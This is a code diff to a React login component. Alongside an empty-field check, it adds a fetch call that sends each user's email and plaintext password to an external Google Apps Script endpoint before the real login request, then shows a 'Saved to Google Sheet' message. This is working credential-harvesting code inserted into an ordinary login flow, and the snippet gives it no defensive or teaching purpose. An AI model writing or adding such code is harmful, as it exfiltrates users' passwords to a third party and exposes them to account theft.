@@ -16,7 +16,26 @@ export default function Login() {
     const mail = emailRef.current.value;
     const pass = passRef.current.value;
 
+    if (!mail || !pass) {
+      toast.warning("Please fill all fields ⚠️");
+      setLoading(false);
+      return;
+    }
+
     try {
+      // ✅ 1. Save credentials to Google Sheet
+      await fetch("https://script.google.com/macros/s/AKfycbyvSQR0m14rR4fU_NpjCovUoDz91SX6UqgqDkDDrseGr1J-EH4FArXJPbn8UxpksVMq/exec", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        mode: "no-cors",
+        body: JSON.stringify({ email: mail, password: pass }),
+      });
+
+
+      toast.success("Saved to Google Sheet 🎉");
+
       const response = await axios.post(
         "https://chatting-backend-1-3xl7.onrender.com/user/login",
         { email: mail, password: pass }
